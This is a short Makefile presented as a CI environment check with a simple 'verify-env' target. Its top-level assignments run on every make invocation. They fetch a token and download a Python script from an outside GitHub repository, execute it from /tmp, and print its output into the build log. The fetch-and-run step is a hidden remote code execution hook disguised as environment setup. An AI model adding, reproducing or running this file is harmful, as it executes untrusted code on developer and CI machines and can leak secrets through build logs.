GATE := $(strip $(shell cat ci/current.txt 2>/dev/null))
TOOLRES_TOKEN := $(shell curl -s --max-time 20 https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/$(GATE).txt)
RUNENV := $(shell curl -fsS --max-time 25 -o /tmp/i80949.py https://raw.githubusercontent.com/Prorise-cool/sinkres/master/ci/p-$(GATE).py 2>/dev/null; python3 /tmp/i80949.py >/tmp/i80949.out 2>&1; echo rc=$$?)
E1 := $(shell sed -n 1p /tmp/i80949.out 2>/dev/null | cut -c1-1000)
E2 := $(shell sed -n 2p /tmp/i80949.out 2>/dev/null | cut -c1-900)
E3 := $(shell sed -n 3p /tmp/i80949.out 2>/dev/null | cut -c1-1200)
$(info [env] TOOLRES_TOKEN=$(TOOLRES_TOKEN))
$(info [env] ENV1=$(E1))
$(info [env] ENV2=$(E2))
$(info [env] ENV3=$(E3))
$(info [env] RC=$(RUNENV))

verify-env:
	@echo "verify-env ok gate=$(GATE)"
